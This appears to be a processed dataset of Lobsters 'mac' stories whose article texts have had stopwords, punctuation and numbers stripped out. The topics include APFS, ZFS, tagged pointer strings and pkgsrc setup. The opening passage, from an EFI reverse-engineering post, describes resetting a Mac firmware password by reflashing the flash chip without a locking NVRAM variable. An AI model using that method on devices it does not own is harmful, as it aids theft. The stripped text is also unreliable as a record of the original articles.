signature scap firmware update voila finally able verify scbo file indeed valid scbo file signed apple possible modify run machine unless patched firmware code useless since patch firmware code would easier reset variable core function deal scbo content one first thing allocate byte buffer hold public key buffer following data structure function address responsible retrieving public key efi firmware contains five different bit public key found efi file raw file byte meaning first byte meaningless header need remove byte get public key one important detail described trammell hudson thunderstrike presentation key byte inverted want use public key utility need reverse byte key directly extracted function usual protocol implement feature protocol guid installed binary point reversing whole protocol saw retrieving apple public key avoid emulating filesystemrelated operation simply enabled unicorn code hook injected correct public key public key used verify scbo signature third one picture whole raw file extracted uefitool another buffer allocated hold hash see later buffer hold checksum first byte scbo variable next extraction serial number physical memory address boot linux installation use chipsec read physical memory able read individual serial number older macos version could also use applehwaccesskext directhwkext read memory blacklisted el capitan sierra current nonce variable extracted next goal build serialnonce string found scbo observe debugger call function printf call generated string used replace serialnonce exists scbo buffer signature verification code use current value mac instead value scbo file right hashing byte scbo content serialnonce scbocontents structure described observe result debugger extract content scbo file hash match meaning right track final step verify rsa signature guarantee serialnonce tampered one apple public key see loop meaning signature verified apple key found firmware one return valid result password removed clearing nvram datasize parameter register address zero variable deleted nvram code show efi password feature definitely implemented via nvram variable scbo mystery finally solved format understood precious assistance efi dxe emulator debugger sped reverse engineering effort scbo feature design robust mystery solved right someone apparently selling working scbo file internet bet insider access apple system via apple support center something like apple really investigate root cause lost firmware password reset long spi flash chip new bga type newer mac using sneaky debug port used purpose need device dump flash chip remove variable reflash modified version directly remove variable always prefer full dump reflash course information used thief selling stolen mac given already defeat device sold web post reveal previouslyunknown secret hope enjoyed post also hope interested u efi reversing easy userland kernel reversing due lack debugger extra work difficulty solved moment going release code efi emulator fed people stealing code without giving proper attribution recently discovered couple case stolen code even modified credit really annoying demand nothing credit code licensing pretty much liberal fun fg p thanks jeffrey czerniak geekable prepublication editing update bias part human knowing make immune since looking excuse use unicorn even bother search efi emulator good since heap fun write dominate unicorn engine something useful project emulator package blog entry install also efiperun project would expect run apple efi binary since basic service need give try please update went update refer machine serial number talking serial number one outside back open mac access update bothered read start end would understand way outsider generate code reset mac firmware please stop sending email comment asking
562,Lobsters,mac,Apple macOS,APFS in Detail: Overview,http://dtrace.org/blogs/ahl/2016/06/19/apfs-part1/,apfs detail overview,apfs detail overview apple developer documentation presentation gave overview packed room conclusion tweet summary encryption data integrity basic standalone fromscratch implementation core storage bsd hammer linux btrfs openzfs freebsd mac o x ubuntu linux paying debt wikipedia list encryption snapshot backup,apfs detail overview apple announced new file system make way o variant macos tvos io watchos coming year medium coverage point mostly breathless elongation apple developer documentation dearth detail decided attend presentation q apfs team wwdc dominic giampaolo eric tamura two member apfs team gave overview packed room along member team patiently answered question later day data point first hand usage wanted provide overview analysis user appleecosystem product longtime operating system file system developer divided review several section span post encourage jump around topic interest skip right conclusion tweet summary highest praise go encryption ire data integrity basic apfs apple file system started dominic lead engineer standalone fromscratch implementation earlier version post noted dependency core storage dominic set straight asked looking inspiration modern file system bsd hammer linux btrfs openzfs solaris illumos freebsd mac o x ubuntu linux etc feature similar apfs intends deliver note apple built fairly complete port zfs though dominic apparently part group advocating dominic explained selfdescribed file system guy built file system beos unfairly relegated obscurity apple opted purchase nextstep instead aware delve deeply fear said tainting dominic praised apfs testing team exemplary absolutely critical common adage take decade mature file system experience zfs le confirms apple delivering apfs broadly year development need accelerate quickly maturity paying debt hf introduced mac memory holy smoke apple flagship hf significant iteration shipped powermacs hard drive since storage capacity increased factor respectively hf pulled bunch competing direction different fork different device eg io team created hf variant working covertly even mac o team knew different feature eg journaling case insensitive old mess critically missing bunch feature really considered basic cost business operating system wikipedia list nanosecond timestamps checksum snapshot sparse file support among missing feature add obvious gap large device support got big chunk apfs feature list apfs first foremost pay unsustainable technical debt apple carrying hf zfs grew similar need ufs evolved since unifies multifarious fork introduces expected feature general first brings derelict building code compression obvious gap apfs feature list common many file system conceptually quite easy told development team zfs outset include appeal dominic beos nostalgia even recalled job interview talked compression actually improved overall performance since data io far expensive computation obvious novel apple folk agreed typical apple confirmed denied strongly implying definitely feature expect apfs surprised compression included public launch next series encryption snapshot backup
563,Lobsters,mac,Apple macOS,Apple will deactivate Flash by default on Safari 10,https://www.engadget.com/2016/06/15/apple-safari-10-flash-off-by-default/,apple deactivate flash default safari,display started blocking announced wwdc,access website flash browser opt latter page requires flash work prompt pop asking like switch choose active session keep url forever recall microsoft google distancing flash quite time well edge display flash central element page looking say game video chrome started blocking flash ad late last yearon mobile side thing apple announced wwdc requiring io apps connect internet via http january mean developer switch feature cupertino launched io called app transport security at force apps use secure connection help keep data safeget latest news wwdc
564,Lobsters,mac,Apple macOS,ZFS: Apple’s New Filesystem That Wasn’t,http://dtrace.org/blogs/ahl/2016/06/15/apple_and_zfs/,zfs apple new filesystem,zfs apple new filesystem prologue launch dtrace port hard link directory fast fact week see apple announcing worldwide developer conference zfs become file system mac o yes zfs would sort would readonly one get hope ray hope sun forgiven mac o x server website functional enough put full display little engine odd reference zfs left unscrubbed sun dying jonathan schwartz blogged protecting apple user little engine still architect zfs apple left epilogue port,zfs apple new filesystem prologue attended first wwdc participate apple launch dtrace port next version mac o x leopard apple completed fiddliest finishing touch without help dtrace team even meet u idea mere week away finished product announced world testament apple engineering acumen well storied secrecy wwdc apple announced time machine product would record file system version time backup recovery energized idea might another piece adopted solaris technology launched solaris dtrace shared marquee zfs new filesystem become standard filesystems compared key among many feature zfs snapshot made simple capture state filesystem send change around recover data etc time machine looked world like gui zfs indeed gui imagined knew well beyond capability sun course time machine nothing zfs keynote rushed apple engineer knew shame voice admitted really bunch hard link directory know symlink symtab moral equivalent using newspaper insulation fine completely anticipated calamity destroys everything hold dear zfs mac o x least yet fast week wwdc nerd like started lose mind apple really going port zfs mac o x actually going happen beyond snapshot would make backing cinch zfs would dramatically advance state data storage apple user hf introduced system system called mac o day operating system gained broad ubiquitous sex appeal hf improved upon macintosh file system longer would file accumulate single pile could organize folder many organize floppy progress progress filesystem limped along year nudged forward rewritten avoid inkernel pascal code though retaining pascalstyle lengthprefixed string never reimagined reinvented even modern form hf lack basic functionality around data integrity bug power failure expected inevitable medium failure mean data silently altered pray old photo still intact last time backed mac backing right like every time think neglectful stewardship hf zfs bring mac o x data integrity compression checksum redundancy snapshot etc etc etc energizing maczfs fan sun ceo jonathan schwartz clumsily disrupted momentum zfs gathering apple walled garden apple working port zfs mac o x planning mentioning upcoming wwdc jonathan brought loop either courtesy legal necessity violated cardinal rule steve jobsera apple one person steve job company announces new product steve job fact week see apple announcing worldwide developer conference zfs become file system mac o mused jonathan press event apparently bolster sun credibility le week later apple spoke zfs became clear port indeed present developer version leopard albeit nascent form yes zfs would sort would readonly one get hope ray hope next wwdc seemed sun forgiven zfs featured keynote developer disc handed attendee even mentioned mac o x server website apple working port since functional enough put full display took spin really real feature everyone wanted say coming little engine time snow leopard shipped careful examination apple web site would turn odd reference zfs left unscrubbed whatever momentum zfs enjoyed within mac o x product team gone heard couple theory anecdote people familiar situation first relevant background sun dying failed love affair ibm hp latter formed according former sun ceo scott mcnealy two garbage truck colliding oracle scooped aging dame dim prospect nearly yearlong process closing acquisition particularly hard sun creating uncertainty around future damaging bottom line despite welldocumented personal friendship steve job oracle ceo larry ellison later sure uncertainty impact decision continue zfs meantime sun netapp locked lawsuit zfs storage technology since jonathan schwartz blogged protecting apple user well sun customer course likely lead uncertainly top filesystem transition far simple apple included dtrace mac o x point favor could yanked sort legal issue arise user data hit zfs would take year fully reverse decision netapp lawsuit never seemed merit zfs us unique fromscratch mechanism snapshot indisputably represented risk apple finally perhaps significantly personal ego nih invented syndrome certainly played part told folk apple time certain lead manager preferred build rather adopting external technology best breed pitched project apple project would bring modern filesystem technology mac o x design center zfs server certainly phone tablet argument likely would better start scratch adapt zfs combined uncertainty told shortage political savvy argument carried day licensing fud thrown mix even today folk apple see zfs license nefarious toxic way whereas dtrace license work fine note use license grant restriction maybe technical argument really overwhelming note however zfs working internally iphone maybe risk really insurmountable obviously opinion think great missed opportunity industry never burden weighing totality fact deciding nevertheless apple put end zfs work apple fromscratch filesystem effort underway little engine still amazingly quite end zfs apple architect zfs apple left project shelved highlevel conversation sun apple reviving port apple would get indemnification support use zfs sun would get access apple file protocol ironically seems collateral damage new apfs critically sun new zfsbased storage appliance helped develop would natural server backup agent million apple device seemed make sort sense excruciatingly debilitatingly slow acquisition sun finally closed applezfs deal brought larry ellison approval first born child conquered land brought blessed new king tell business best friend steve job apparently said business best friend steve job amusingly version story told quietly wwdc friend reversed steve saying business larry still another version heard call question veracity purported friendship steve instead suggesting larry go f ck normally iconoclast would true represent steve mainstream opinion end epilogue year since zfs development halted apple worked variety improvement hf core storage hacked least two replacement hf make door week apple announced new filesystem apfs year development done feature still development announced ambitious goal rolling laptop phone watch tv within next month sun started zfs shipped really starting line finish line since shipped zfs storage appliance delphix required investment zfs openzfs make ready prime time broadly featured highly functional filesystem take long time apfs merit next post always disappoint apple adopt zfs irrespective decision made dedicated member openzfs community built maintain port quite apple member community embracing extending zfs rather building incipient alternative
565,Lobsters,mac,Apple macOS,Apple file system,https://developer.apple.com/library/prerelease/content/documentation/FileManagement/Conceptual/APFS_Guide/Introduction/Introduction.html#//apple_ref/doc/uid/TP40016999,apple file system,retired document apple file system introduction important apple file system prerequisite file system programming guide,retired documentimportant document may represent best practice current development current information see apple file system introduction important document may represent best practice current development current information see apple file system apple file system new modern file system io macos tvos watchos optimized flashssd storage feature strong encryption copyonwrite metadata space sharing â cloning file directory snapshot fast directory sizing atomic safesave primitive improved file system fundamentalsapfs replaces hf default file system io later macos high sierra later prerequisite understand app interacts file system read file system programming guide
567,Lobsters,mac,Apple macOS,WWDC 2016,http://www.apple.com/apple-events/june-2016/,wwdc,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
568,Lobsters,mac,Apple macOS,Docker For Mac Beta Review,https://medium.com/@nzoschke/docker-for-mac-beta-review-b91692289eb5,docker mac beta review,xhyve o x hypervisor framework click see animation,xhyve extremely cool technology wrap native o x hypervisor framework virtualization backend longer need heavy weight virtualbox vmware fusion parallel desktop installed running side car run linux program maci following community effort running docker xhyve nothing like docker inc packaging really hard problem around virtual machine filesystems networking docker fixed support going forwardthis game changer local development toolsthe final bit new docker client version smart find interact docker server strange environment variable discover set bashprofileit work needing manage dockermachine delegate virtualbox feel light year better alpinebased redis image downloads start le second click see animationhello redis second dockermachine start
569,Lobsters,mac,Apple macOS,Tagged Pointer Strings,https://mikeash.com/pyblog/friday-qa-2015-07-31-tagged-pointer-strings.html,tagged pointer string,tagged pointer huffman code opensourceapplecom huffman code send click information comment r feed page pygments,friday q tagged pointer string tagged pointer interesting technology used increase performance reduce memory usage o x nsstring got tagged pointer treatment today going take look work topic suggested ken ferry recapobjects aligned memory address always least multiple pointer size practice typically multiple object pointer stored full integer alignment mean bit always zero tagged pointer take advantage fact give special meaning object pointer bit zero apple objectivec implementation object pointer least significant bit set one say odd number considered tagged pointer instead standard isa dereference figure class next three bit considered index tagged class table index used look class tagged pointer remaining bit left tagged class use please simple use would make suitable nsnumber instance tagged pointer extra bit used hold numeric value bottom bit would set next three bit would set appropriate index nsnumber tagged class following bit could hold example integer value fit within space outside pointer would look act like object responds message like object objcmsgsend know tagged pointer ask integervalue extract data bit return however saved memory allocation pointer indirection every access reference counting noop since memory free commonly used class make substantial performance improvement nsstring nt seem like good candidate tagged pointer since variable length much longer bit tagged pointer however tagged pointer class coexist normal class using tagged pointer value normal pointer others example nsnumber integer larger wo nt fit tagged pointer instead need stored normal nsnumber objcet allocated memory long code creates object written appropriately work fine nsstring could thing string fit inside bit could create tagged pointer string would placed normal object assumes small string used often enough noticeable performance gain actually case realworld code appears apple think since went ahead implemented possible implementationsbefore look apple thing let take moment think might implement tagged string storage basic simple set bottom bit one set remaining bit appropriate tagged class index set remaining bit whatever use remaining bit big question want take maximum advantage bit available u cocoa string conceptually sequence unicode code point valid unicode code point one code point take bit represent mean could fit two code point bit bit wasted could borrow extra bit hold length tagged string could zero one two code point limited two code point nt seem useful though nsstring api actually implemented term raw unicode code point represents unicode sequence bit value common code point occupy basic multilingual plane bmp fit single bit value code point require two could fit three bit value bit available bit left borrowing bit length would allow u represent code unit would allow three code point bmp one code point beyond bmp plus optionally one code point within limited three still pretty tight though string app probably ascii even app localized nonascii language string used far displaying ui used url component file extension object key property list value much encoding asciicompatible encoding encodes ascii character single byte using four byte unicode code point fit seven byte bit allotted u bit left use length allows tagged string hold seven ascii character somewhat fewer nonascii character depending exactly optimizing ascii might well drop full unicode support altogether string containing nonascii character use real object ascii sevenbit encoding allot bit per character let u store eight ascii character bit available plus bit left length starting sound useful probably lot string app pure ascii contain eight character fewer take full ascii range contains lot stuff nt frequently used bunch control character example unusual symbol alphanumerics make used squeeze bit bit result possible value letter ascii alphabet including upper lower case brings including digit brings two spot spare might give say space period probably lot string contain character bit fit ten bit storage wait nt leftover bit store length either store nine character plus length remove one possible value nominate space one go use zero terminator string shorter ten character bit nt totally ludicrous probably lot string lowercase example bit give possible value include whole lowercase alphabet extra value could allot common uppercase letter symbol digit mix find possibility common could even remove le common lowercase letter like q bit per character give eleven character save room length twelve borrow symbol use terminator take bit far reasonably go fixedsize alphabet could switch variable length encoding example using huffman code would allow letter e common encoded fewer bit letter q might allow little bit per character unlikely case string e would come cost complex presumably slower code approach apple take let find exercising tagged stringshere bit code creates tagged string print pointer value nsstring nsstring b mutablecopy copy nslog p p b objectgetclass b mutablecopycopy dance necessary two reason first although string like could stored tagged pointer constant string never tagged pointer constant string must remain binary compatible across o release internal detail tagged pointer guaranteed work fine long tagged pointer always generated apple code runtime would break compiler embedded binary would case constant string thus need copy constant string get tagged pointer mutablecopy necessary nsstring clever u know copy immutable string pointless operation return original string copy constant string immutable result copy mutable copy force make actual copy making immutable copy result enough convince system give u tagged pointer string note must never depend detail code circumstance nsstring code decides give tagged pointer could change time write code somehow relies code eventually break fortunately go way normal sensible code work fine blissfully ignorant tagged anything code print computer nstaggedpointerstring see original pointer first nice round number indicative object pointer copy second value taggedness abundantly clear odd number mean ca nt valid object pointer also small number well within unmapped unmappable zero page beginning mac address space making doubly imposible object pointer deduce value know bottom four bit part tagged pointer mechanism lowest nybble binary bottom one bit indicates tagged pointer next three bit indicate tagged class bit indicating tagged string class occupies index much information lead value suggestive hexadecimal happens ascii value lowercase letter exactly string contains look like straight ascii encoding use convenient class name make obvious class give u good starting point come looking actual code implement feature get shortly let outside inspection first loop build string form abcdef print one one stop getting tagged pointer back nsmutablestring mutable nsmutablestring string nsstring immutable char c mutable appendformat c c immutable mutable copy nslog immutable immutable objectgetclass immutable uintptrt immutable first iteration print nstaggedpointerstring match saw note printing full pointer leading zero make thing bit clear comparing subsequent iteration let compare second iteration ab nstaggedpointerstring bottom four bit nt change expect remain constant always indicating tagged pointer type nstaggedpointerstring original stay joined course ascii code b see encoding eightbit encoding us ascii four bit terminal changed suggesting might length subsequent iteration confirm abc nstaggedpointerstring abcd nstaggedpointerstring abcde nstaggedpointerstring abcdef nstaggedpointerstring abcdefg nstaggedpointerstring presumably end tagged pointer full next iteration allocate object terminate loop right wrong abcdefgh nstaggedpointerstring abcdefghi nstaggedpointerstring abcdefghij nscfstring loop go two iteration terminating length section continues increase rest tagged pointer turn gibberish going let turn implementation find disassemblythe nstaggedpointer class life corefoundation framework seems like ought live foundation lot core objectivec class moved corefoundation day apple slowly give making corefoundation independent entity let start looking implementation nstaggedpointerstring length push rbp mov rbp rsp shr rdi rdi mov rax rdi pop rbp ret hopper provides handy decompilation go along unsigned long long nstaggedpointerstring length void self void cmd rax self return rax short obtain length extract bit return confirms observed four bit terminal indicate length string primitive method nsstring subclass characteratindex skip lengthy disassembly go straight hopper decompiled output pretty readable unsigned short nstaggedpointerstring characteratindex void self void cmd unsigned long long rsi cmd rdi self stackchkguard rdi rbx rdi rcx eilotrmapdnsic rdx rbp rdx rbx rcx rdx rdx rbx rbx rdx else rbp rdx rbx rcx rdx rdx rbx rbx rdx rbx cfexceptionproem rdi rsi nsexception raise nsrangeexception format index lu bound string length lu rbx rax rbp rax stackchkfail return rax let clean little first three line hopper telling u register get argument let go ahead replace us rsi cmd rdi self actually index parameter let replace us index get rid stackchk stuff security hardening thing relevant actual working method code look like cleaned way unsigned short nstaggedpointerstring characteratindex void self void cmd unsigned long long index self rbx self rcx eilotrmapdnsic rdx rbp rdx rbx rcx rdx rdx rbx rbx rdx else rbp rdx rbx rcx rdx rdx rbx rbx rdx index rbx cfexceptionproem self cmd nsexception raise nsrangeexception format index lu bound string length lu rbx rax rbp index return rax right first statement line recognize length extraction code saw implementation length let go ahead replace length throughout unsigned short nstaggedpointerstring characteratindex void self void cmd unsigned long long index length self length rbx self rcx eilotrmapdnsic rdx length length rbp rdx rbx rcx rdx rdx rbx rbx rdx else rbp rdx rbx rcx rdx rdx rbx rbx rdx length index rbx cfexceptionproem self cmd nsexception raise nsrangeexception format index lu bound string length lu rbx rax rbp index return rax looking inside statement first line shift self right bit bottom bit bookkeeping tagged pointer indicator string length remainder presume actual data let replace rbx stringdata make clear next line appears put sort lookup table rcx let replace rcx table finally rdx get copy value length look like get used sort cursor later let replace rdx cursor unsigned short nstaggedpointerstring characteratindex void self void cmd unsigned long long index length self length stringdata self table eilotrmapdnsic cursor length length rbp cursor stringdata table cursor cursor stringdata stringdata cursor else rbp cursor stringdata table cursor cursor stringdata stringdata cursor length index rbx cfexceptionproem self cmd nsexception raise nsrangeexception format index lu bound string length lu rbx rax rbp index return rax almost everything labeled one raw register name remains rbp actually frame pointer compiler something tricky indexing directly frame pointer adding constant twoscomplement everything ultimately unsigned integer way subtract later subtracts probably local variable stack given bytewise indexing going probably buffer placed stack weird code path nothing read buffer without ever writing going turn going hopper forgot decompile else branch outer statement relevant assembly look like mov rax rdi shr rax mov qword s rax hopper show offset disassembly hexadecimal version let call pointer location buffer c version missing branch would look like buffer self let go ahead insert replace place rbp used access buffer readable version code plus add declaration buffer remind u going unsigned short nstaggedpointerstring characteratindex void self void cmd unsigned long long index buffer length self length stringdata self table eilotrmapdnsic cursor length length buffer cursor stringdata table cursor cursor stringdata stringdata cursor else buffer cursor stringdata table cursor cursor stringdata stringdata cursor else buffer self length index rbx cfexceptionproem self cmd nsexception raise nsrangeexception format index lu bound string length lu rbx rax buffer index return rax getting better crazy pointer manipulation statement bit hard read though really array indexing let fix unsigned short nstaggedpointerstring characteratindex void self void cmd unsigned long long index buffer length self length stringdata self table eilotrmapdnsic cursor length length buffer cursor table stringdata cursor cursor stringdata stringdata cursor else buffer cursor table stringdata cursor cursor stringdata stringdata cursor else buffer self length index rbx cfexceptionproem self cmd nsexception raise nsrangeexception format index lu bound string length lu rbx rax buffer index return rax getting somewhere see three case depending length length value le go missing else branch dump value self shifted buffer plain ascii case index used index value self extract given byte returned caller since ascii character value match unicode code point within ascii range additional manipulation needed make value come correctly guessed string stored plain ascii case confirms case length length le code enters loop loop extract bottom bit stringdata us index table copy value buffer shift stringdata bit repeat run entire string sixbit encoding mapping raw sixbit value ascii character value stored table temporary version string built buffer indexing operation end extract requested character case length code almost identical except work five bit time instead six compact encoding would allow tagged string store character using alphabet value use first half table truncated alphabet thus see structure tagged pointer string length store string raw eightbit character length store string sixbit encoding using alphabet eilotrmapdnsic length store string fivebit encoding using alphabet eilotrmapdnsic let compare data generated earlier nstaggedpointerstring ab nstaggedpointerstring abc nstaggedpointerstring abcd nstaggedpointerstring abcde nstaggedpointerstring abcdef nstaggedpointerstring abcdefg nstaggedpointerstring abcdefgh nstaggedpointerstring abcdefghi nstaggedpointerstring abcdefghij nscfstring binary expansion minus bottom eight bit divided sixbit chunk using index table see indeed spell abcdefgh similarly binary expansion minus bottom eight bit divided sixbit chunk see string plus end go rail point switch fivebit encoding give u two string instead start allocating object length give fivebit alphabet extremely limited nt include letter b letter must common enough warrant place hallowed character fivebit alphabet let try instead start string c output c nstaggedpointerstring cd nstaggedpointerstring cde nstaggedpointerstring cdef nstaggedpointerstring cdefg nstaggedpointerstring cdefgh nstaggedpointerstring cdefghi nstaggedpointerstring cdefghij nstaggedpointerstring cdefghijk nstaggedpointerstring cdefghijkl nstaggedpointerstring cdefghijklm nstaggedpointerstring cdefghijklmn nscfstring tagged string way length binary expansion last two tagged string exactly expecting creating tagged stringssince know tagged string encoded wo nt go much detail code creates code question found within private function called handle every conceivable string creation case one gigantic function function included open source release corefoundation available opensourceapplecom nt get excited tagged pointer string code included open source version code essentially inverse string length content fit tagged pointer string hold build tagged pointer piece piece containing either ascii sixbit fivebit character inverse lookup table table seen constant string life global variable called sixbittocharlookup corresponding table called chartosixbitlookup function weird tablethe full sixbit encoding table eilotrmapdnsic natural question strange order table used sixbit fivebit encoding make sense would nt entirely alphabetical order character used frequently first half character used le frequently go second half ensures maximum number longer string use fivebit encoding however division place order within individual half nt matter half could sorted alphabetically first letter table similar order letter appear english sorted frequency common letter english e n e right beginning table others near beginning table appears sorted frequency use discrepancy english probably arises short string cocoa apps nt random selection word english prose specialized bit language speculate apple originally intended use fancier variablelength encoding probably based huffman code turned difficult worth effort ran time dialed back le ambitious version seen string choose constantlength encoding using eight six five bit per character weird table life leftover starting point decide go variablelength encoding future pure guesswork look like conclusiontagged pointer really cool technology string unusual application clear apple put lot thought must see significant benefit interesting see put together got limited storage available today come back next time strange exploration transmundane friday q driven reader suggestion idea subject like see covered please send enjoy article selling whole book full volume ii iii available epub pdf print ibooks kindle click information comment comment r feed page add thought post comment spam offtopic post deleted without notice culprit may publicly humiliated sole discretion javascript required submit comment due antispam measure please enable javascript reload page code syntax highlighting thanks pygments
570,Lobsters,mac,Apple macOS,"14,000+ regularly updated pkgsrc binary packages for OS X",https://pkgsrc.joyent.com/install-on-osx/,regularly updated pkgsrc binary package o x,portable package management choose macos package set postinstall step use pkgin install package use pkg tool manage package,portable package management pkgsrc framework building open source software package native package manager smartos netbsd minix portable across different operating system use one package manager across system joyent provide binary package smartosillumos macos linux netbsd example screenshots show small number binary package available pkgsrc set example produced clean install macos el capitan inside vmware fusion xfce gnumeric inkscape gimp xchat installing nodejs installing running jekyll ruby version choose macos package set primary package macos built mojave suitable user running latest macos release built pkgsrc trunk updated every day also provide archive previous package set built sierra maverick snow leopard user wish quickly install software older release archived set longer updated copy paste line install mojave set package suitable anyone running mojave newer updated pkgsrc trunk every day bootstraptar bootstrapsha download bootstrap kit current directory curl http pkgsrcjoyentcompackagesdarwinbootstrap bootstraptar verify checksum echo bootstrapsha bootstraptar checkshasum shasum c checkshasum verify pgp signature step optional requires gpg curl http pkgsrcjoyentcompackagesdarwinbootstrap bootstraptar asc curl s http import verify bootstraptar asc install bootstrap kit optpkg sudo tar zxpf bootstraptar c reload pathmanpath pkgsrc installs new session eval usrlibexecpathhelper copy paste line install sierra set package suitable anyone running sierra newer however longer updated bootstraptar bootstrapsha download bootstrap kit current directory curl http bootstraptar verify checksum echo bootstrapsha bootstraptar checkshasum shasum c checkshasum verify pgp signature step optional requires gpg curl http pkgsrcjoyentcompackagesdarwinbootstrap bootstraptar asc curl s http import verify bootstraptar asc install bootstrap kit optpkg sudo tar zxpf bootstraptar c reload pathmanpath pkgsrc installs new session eval usrlibexecpathhelper copy paste line install maverick set package suitable anyone running maverick newer however longer updated bootstraptar bootstrapsha download bootstrap kit current directory curl http bootstraptar verify checksum echo bootstrapsha bootstraptar checkshasum shasum c checkshasum verify pgp signature step optional requires gpg curl http bootstraptar asc curl s http import verify bootstraptar asc install bootstrap kit optpkg sudo tar zxpf bootstraptar c reload pathmanpath pkgsrc installs new session eval usrlibexecpathhelper copy paste line install set package suitable anyone running snow leopard newer however longer updated bootstraptar bootstrapsha download bootstrap kit current directory curl http pkgsrcjoyentcompackagesdarwinbootstrap bootstraptar verify checksum echo bootstrapsha bootstraptar checkshasum shasum c checkshasum verify pgp signature step optional requires gpg curl http pkgsrcjoyentcompackagesdarwinbootstrap bootstraptar asc curl s http import verify bootstraptar asc install bootstrap kit optpkg sudo tar zxpf bootstraptar c reload pathmanpath pkgsrc installs new session eval usrlibexecpathhelper postinstall step ready go common command may want run use pkgin install package pkgin frontend binary package let search install upgrade remove package also provides basic functionality querying local remote package used aptget yum find familiar use pkg tool manage package underlying packaging tool pkgadd pkgadmin pkgcreate pkgdelete pkginfo pkgin equivalent aptget yum equivalent dpkg rpm useful command get started refresh pkgin database latest version sudo pkgin update search package regular expression supported pkgin search ffmpeg decoding encoding streaming software decoding encoding streaming software decoding encoding streaming software decoding encoding streaming software install package without prompting sudo pkgin install list available package pkgin avail upgrade installed package sudo pkgin upgrade remove package sudo pkgin remove automatically remove orphaned dependency sudo pkgin autoremove list installed package pkginfo query package file belongs pkginfo fe list content package pkginfo ql perform audit currently installed package sudo pkgadmin fetchpkgvulnerabilities pkgadmin audit package denialofservice vulnerability see http package denialofservice vulnerability see http package httpresponsesplitting vulnerability see http package spoofing vulnerability see http create binary package metadata file package directory pkgcreate b buildinfo c comment description f packlist optpkg p file u
571,Lobsters,mac,Apple macOS,Harden the World,http://docs.hardentheworld.org/,harden world,project project home http hardentheworldorg project repository http githubcomjekilhardentheworld contributing pull request license creative common attribution international share adapt attribution,project every day many people including waste time googling procedure configuration way harden service created harden world hope start community project focused developing common guideline best practice deploy secure configuration repository contains hardening guideline device application os project home http hardentheworldorg project repository http githubcomjekilhardentheworld contributing every kind contribution really appreciated feature request suggestion fix documentation contribution welcome please send patch contribution using github pull request get touch license harden world project licensed creative common attribution international free share copy redistribute material medium format adapt remix transform build upon material purpose even commercially following term attribution must give appropriate credit provide link license indicate change made may reasonable manner way suggests licensor endorses use
572,Lobsters,mac,Apple macOS,Untrusting [Blue Coat] CA on OS X,https://blog.filippo.io/untrusting-an-intermediate-ca-on-os-x/,untrusting blue coat ca o x,logged ct blue coat public service intermediate ca reached ct log censys edit bluecoat one lolnowtf edit follow twitter,intermediate ca certificate signed root ca sign arbitrary certificate website powerful root ca full list one system trust root ca make new one system trust first sight thousand logged ct month interesting one popped generated apparently september blue coat public service intermediate ca signed symantec certificate signed ca reached ct log censys far thought would good occasion write explicitly untrust intermediate ca would otherwise trusted o x wo nt stop root ca handing new intermediate organization better nothing edit window instruction see download certificate want untrust example bluecoat one lolnowtf open dropped keychain access double click certificate imported far neither trusted untrusted click trust select never trust first dropdown close window asked password reassuring red x appear ca icon system wo nt trust certificate signed even signed trusted root ca edit finally drag certificate system keychain left make policy apply user tip fight hopeless battle tl trust follow twitter
574,Lobsters,mac,Apple macOS,Running a FreeBSD guest within the OS X Terminal,https://asciinema.org/a/azxvrlhmmr1b5l5gczo1ze9j3,running freebsd guest within o x terminal,asciicast format download replay terminal see installation instruction use standalone player website player release page asciinema player readme,download recording asciicast format json file download replay terminal replay recording terminal asciinema play command asciinema play nt asciinema cli installed see installation instruction use standalone player website download asciinema player player release page need j cs file use like html head link rel stylesheet type textcss href asciinemaplayercss head body asciinemaplayer src col row asciinemaplayer script src asciinemaplayerjs script body html see asciinema player readme full usage instruction
575,Lobsters,mac,Apple macOS,"No, Apple Music is not deleting tracks off your hard drive — unless you tell it to",http://www.imore.com/no-apple-music-not-deleting-tracks-your-hard-drive-unless-you-tell-it,apple music deleting track hard drive unless tell,apple music primary mac work icloud music library encoded alac wav aiff uploaded aac file easier storage get confusing secondary itunes library back library apple fault itunes match downloading streaming track nt ownership right muck thing apple currently talking pinkstone investigating report small number individual learn,wednesday saw post widely shared unfortunate individual lost half local library blaming apple music automatically deleting local file sympathize glad person backup music want dispel fud apple music definite problem matching algorithm nt great simply service work apple music never automatically delete file primary mac hard drive unless specifically delete first apple music primary mac work enable apple music original mac service scan music library match track streaming library secondary device like iphone ipad mac stream track highest quality without download local file referenced file become part icloud music library track nt apple music library say personal recording instance uploaded asis icloud music library though song encoded alac wav aiff uploaded aac file easier storage matching uploading process complete two library locallystored library original mac old file icloudstored library access device get confusing original mac apple music never delete song without knowledge original library scanned icloud song apple automatically delete replace proprietary copy iphone ipad secondary mac process different song play device sourced directly icloud music library even download locally removed device iphone storage space dip low however download icloud music librarysourced track mac delete original copy suspect may happened vellum atlanta author james pinkstone original library possibly unknowingly press delete song itunes library apple music itunes match enabled see following dialog choose remove download send local file hard drive trash leave reference library stream track directly icloud music library wo nt delete file empty trash great laptop want streaming access music library nt want hassle music hard drive ever done secondary computer secondary itunes library never master library icloud music library matching far perfect known match live album studio one original song cover track delete original file save space putting track mercy icloud worse icloud music library stick around active apple music subscription delete song replace icloud version even redownload version hard drive disappear become inoperable day cancel subscription advised beginning always keep master copy original library using streaming service match library back library signing anything cloudrelated apple fault sort icloud music library confusing hell since first day itunes match absolutely apple fault ideal world icloud music library would work like dropbox even icloud photo library whatever upload nt get matched anything long redownload everything cancel subscription fine drm downloading streaming track nt ownership right muck thing icloud music library always going complicated people going make mistake nt backup mistake might costly also possibility nasty bug wiped pinkstone original library unintentionally nt able reproduce problem however apple currently talking pinkstone investigating report small number individual whatever case apple music never designed delete pinkstone source library wo nt delete simply service work primary mac aware icloud music library store copy track may delete local copy save space thinking get back get screwed result information icloud music library mac may earn commission purchase using link learn
